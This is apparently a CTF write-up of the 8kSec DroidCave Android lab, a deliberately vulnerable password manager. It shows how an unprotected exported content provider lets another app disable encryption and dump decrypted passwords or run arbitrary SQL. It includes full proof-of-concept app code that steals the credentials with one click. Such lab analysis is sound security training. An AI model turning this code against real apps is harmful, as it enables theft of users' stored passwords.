---
title:  "8kSec DroidCave Writeup"
date:   2025-09-12T16:34:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for DroidCave challenge from 8kSec Android Labs. 

```
Goal:
Goal is to develop an Android application with an innocent appearance that can, with just one click of a seemingly normal button, extract both plaintext passwords and the decrypted form of encrypted passwords from the DroidCave database.
```

## Static Analysis

![](/assets/8ksec_droidcave_image/screen1.png)

DroidCave app is a password manager app. We can store our usernames, passwordsa and some details about accounts. Also we can enable encryption mode and app will encrypt the password before saving. Lets start our analysis with jadx.

### Code Analysis

```xml
...
...
<activity android:name="com.eightksec.droidcave.MainActivity" android:exported="false" android:windowSoftInputMode="adjustResize"/>
<activity android:name="com.eightksec.droidcave.ui.auth.LockScreenActivity" android:exported="false" android:windowSoftInputMode="adjustResize"/>
<provider android:name="com.eightksec.droidcave.provider.PasswordContentProvider" android:exported="true" android:authorities="com.eightksec.droidcave.provider" android:grantUriPermissions="true"/>
<provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.eightksec.droidcave.androidx-startup">
...
...

```
App has some activities and content providers but most of them are not exported. Only `PasswordContentProvider` provider is exported and also its not protected by any permission.

PasswordContentProvider:

![](/assets/8ksec_droidcave_image/screen2.png)

This provider define a uri matcher with some strings(uri segments):
```java
static {
        UriMatcher uriMatcher = new UriMatcher(-1);
        MATCHER = uriMatcher;
        uriMatcher.addURI(AUTHORITY, "passwords", 1);
        uriMatcher.addURI(AUTHORITY, "passwords/#", 2);
        uriMatcher.addURI(AUTHORITY, "password_search/*", 3);
        uriMatcher.addURI(AUTHORITY, "password_type/*", 4);
        uriMatcher.addURI(AUTHORITY, "execute_sql/*", 5);
        uriMatcher.addURI(AUTHORITY, "settings/*", 6);
        uriMatcher.addURI(AUTHORITY, PATH_DISABLE_ENCRYPTION, 7);
        uriMatcher.addURI(AUTHORITY, PATH_ENABLE_ENCRYPTION, 8);
        uriMatcher.addURI(AUTHORITY, "set_password_plaintext/*/*", 9);
    }
```
This uri types checked with a switch case and app runs related actions with uri:

![](/assets/8ksec_droidcave_image/screen3.png)

We can trigger this actions and get some data from this content provider via defined uri's.

### Exploit

As i mentioned before, app can encrypt stored password on encrypted mode. We need to decrypt them before pulling data. On switch case, number 7 is responsible fot this job:

```java
case 7:
                try {
                    SharedPreferences sharedPreferences9 = this.sharedPreferences;
                    if (sharedPreferences9 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                        sharedPreferences9 = null;
                    }
                    sharedPreferences9.edit().putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false).commit();
                    Context context2 = getContext();
                    if (context2 != null && (applicationContext = context2.getApplicationContext()) != null && (sharedPreferences = applicationContext.getSharedPreferences("settings_prefs", 0)) != null && (edit = sharedPreferences.edit()) != null && (putBoolean = edit.putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false)) != null) {
                        Boolean.valueOf(putBoolean.commit());
                    }
                    ...
                    ...
                try {
                    EncryptionService encryptionService = new EncryptionService();
                    SupportSQLiteDatabase supportSQLiteDatabase15 = this.database;
                    if (supportSQLiteDatabase15 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("database");
                        supportSQLiteDatabase15 = null;
                    }
                    Cursor query = supportSQLiteDatabase15.query("SELECT id, password FROM passwords WHERE isEncrypted = 1");
                    ArrayList arrayList = new ArrayList();
                    ArrayList arrayList2 = new ArrayList();
                    while (query.moveToNext()) {
                        long j = query.getLong(query.getColumnIndexOrThrow("id"));
                        byte[] blob = query.getBlob(query.getColumnIndexOrThrow("password"));
                        try {
                            Intrinsics.checkNotNull(blob);
                            byte[] bytes = encryptionService.decrypt(blob).getBytes(Charsets.UTF_8);
                            Intrinsics.checkNotNullExpressionValue(bytes, "getBytes(...)");
                            ContentValues contentValues = new ContentValues();
                            contentValues.put("password", bytes);
                            contentValues.put("isEncrypted", (Integer) 0);
                            
```
It sets the related shared pref value to false and decrypt the password on database. For making this job with another app, we can query the `disable_encryption` uri segment.

```java
private static final String PATH_DISABLE_ENCRYPTION = "disable_encryption";
...
...
uriMatcher.addURI(AUTHORITY, PATH_DISABLE_ENCRYPTION, 7)
```

As defined in manifest file and provider class, authority for this provider is 
```
com.eightksec.droidcave.provider
```
We can query this uri with this code block:

```java
private static final String CONTENT_URI_STRING = "content://com.eightksec.droidcave.provider/";

//Disable Encryption:
Uri contentUri1 = Uri.parse(CONTENT_URI_STRING + "disable_encryption");
Cursor cursor1 = getContentResolver().query(contentUri1, null, null, null, null);
```
After that we need to pull decrypted data from provider. We can use case 1,2 or 5. We can get all passwords with case 1 and 2 and run sql commands with case 5.

Sample Code for case 1-2:(thx AI)
```java
private static final String CONTENT_URI_STRING = "content://com.eightksec.droidcave.provider/";

//Get Passwords
Uri contentUri = Uri.parse(CONTENT_URI_STRING + "passwords/");
Cursor cursor = getContentResolver().query(
        contentUri, null, null, null, null
);

String[] columnNames = cursor.getColumnNames();

String blobby = "";
if (cursor != null) {
    columnNames = cursor.getColumnNames();

    try {
        if (cursor.getCount() == 0) {
            Log.d("Evil", "No rows returned from query.");
        }

        int rowNum = 0;
        while (cursor.moveToNext()) {
            rowNum++;
            StringBuilder rowLog = new StringBuilder();
            rowLog.append("Row ").append(rowNum).append(": ");

            for (String col : columnNames) {
                int idx = cursor.getColumnIndex(col);
                int type = cursor.getType(idx);
                switch (type) {
                    case Cursor.FIELD_TYPE_STRING:
                        rowLog.append(col).append("=")
                                .append(cursor.getString(idx)).append("; ");
                        break;
                    case Cursor.FIELD_TYPE_INTEGER:
                        rowLog.append(col).append("=")
                                .append(cursor.getLong(idx)).append("; ");
                        break;
                    case Cursor.FIELD_TYPE_FLOAT:
                        rowLog.append(col).append("=")
                                .append(cursor.getDouble(idx)).append("; ");
                        break;
                    case Cursor.FIELD_TYPE_BLOB:
                        byte[] blob = cursor.getBlob(idx);
                        blobby = new String(blob, StandardCharsets.UTF_8);
                        rowLog.append(col)
                                .append(" (BLOB)=")
                                .append(blobby)
                                .append("; ");
                        break;
                    case Cursor.FIELD_TYPE_NULL:
                        rowLog.append(col).append("=NULL; ");
                        break;
                }
            }

            Log.d("Evil", rowLog.toString());
        }

    } finally {
        cursor.close();
    }
} else {
    Log.e("Evil", "Query returned null cursor!");
}

```
Sample code for sql execution:

```java
//Execute Sql
Uri contentUri = Uri.parse(CONTENT_URI_STRING + "execute_sql/" + "SELECT * FROM passwords");
Cursor cursor = getContentResolver().query(
        contentUri, null, null, null, null
);
//...
//Same while loop here
//...
```

PoC app code:(ı used same app that ı wrote for previous challenge)
Manifest File:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.pwndroidcave">
    <queries>
        <package android:name="com.eightksec.droidcave" />
    </queries>
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.PwnAndroDialer">
        <activity
            android:name="com.example.pwndroidcave.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

    </application>

</manifest>
```

Dont forget to adding `queries` section on manifest file, we have to add this on newer android versions.
- Reference: [https://developer.android.com/training/package-visibility](https://developer.android.com/training/package-visibility)


MainActivity:
```java
package com.example.pwndroidcave;

import androidx.appcompat.app.AppCompatActivity;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.nio.charset.StandardCharsets;

public class MainActivity extends AppCompatActivity {

    private static final String CONTENT_URI_STRING = "content://com.eightksec.droidcave.provider/";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button1 = (Button) findViewById(R.id.button);
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //Disable Encryption:
                Uri contentUri1 = Uri.parse(CONTENT_URI_STRING + "disable_encryption");
                Cursor cursor1 = getContentResolver().query(
                        contentUri1, null, null, null, null
                );
                //Execute Sql
                /*
                Uri contentUri = Uri.parse(CONTENT_URI_STRING + "execute_sql/" + "SELECT * FROM passwords");
                Cursor cursor = getContentResolver().query(
                        contentUri, null, null, null, null
                );
                */
                //Get Passwords
                Uri contentUri = Uri.parse(CONTENT_URI_STRING + "passwords/");
                Cursor cursor = getContentResolver().query(
                        contentUri, null, null, null, null
                );
                String[] columnNames = cursor.getColumnNames();
                String blobby = "";
                if (cursor != null) {
                    columnNames = cursor.getColumnNames();

                    try {
                        if (cursor.getCount() == 0) {
                            Log.d("Evil", "No rows returned from query.");
                        }

                        int rowNum = 0;
                        while (cursor.moveToNext()) {
                            rowNum++;
                            StringBuilder rowLog = new StringBuilder();
                            rowLog.append("Row ").append(rowNum).append(": ");

                            for (String col : columnNames) {
                                int idx = cursor.getColumnIndex(col);
                                int type = cursor.getType(idx);
                                switch (type) {
                                    case Cursor.FIELD_TYPE_STRING:
                                        rowLog.append(col).append("=")
                                                .append(cursor.getString(idx)).append("; ");
                                        break;
                                    case Cursor.FIELD_TYPE_INTEGER:
                                        rowLog.append(col).append("=")
                                                .append(cursor.getLong(idx)).append("; ");
                                        break;
                                    case Cursor.FIELD_TYPE_FLOAT:
                                        rowLog.append(col).append("=")
                                                .append(cursor.getDouble(idx)).append("; ");
                                        break;
                                    case Cursor.FIELD_TYPE_BLOB:
                                        byte[] blob = cursor.getBlob(idx);
                                        blobby = new String(blob, StandardCharsets.UTF_8);
                                        rowLog.append(col)
                                                .append(" (BLOB)=")
                                                .append(blobby)
                                                .append("; ");
                                        break;
                                    case Cursor.FIELD_TYPE_NULL:
                                        rowLog.append(col).append("=NULL; ");
                                        break;
                                }
                            }
                            Log.d("Evil", rowLog.toString());
                        }
                    } finally {
                        cursor.close();
                    }
                } else {
                    Log.e("Evil", "Query returned null cursor!");
                }
            }
        });
    }
}
```
### Final

PoC Video: [Youtube](https://youtu.be/MoVDioLQe8A)

Thats all, see you!